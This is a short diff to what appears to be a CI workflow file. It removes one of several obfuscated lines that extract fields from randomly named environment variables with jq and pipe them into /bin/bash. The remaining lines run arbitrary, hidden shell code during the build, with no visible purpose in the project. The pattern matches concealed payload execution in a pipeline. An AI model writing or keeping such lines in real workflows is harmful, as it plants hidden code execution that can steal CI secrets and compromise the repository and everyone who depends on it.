@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$dsq8315" | jq -r .x9 | /bin/bash
           echo $qod8241 | jq -r .cqa972 | /bin/bash
-          echo $m5017 | jq -r .p2 | /bin/bash
           echo $rx40 | jq -r .ivgyn25 | /bin/bash
           printf '%s' "$guw58928" | jq -r .mdh75 | /bin/bash
           echo $xwvhd237 | jq -r .u80111 | /bin/bash
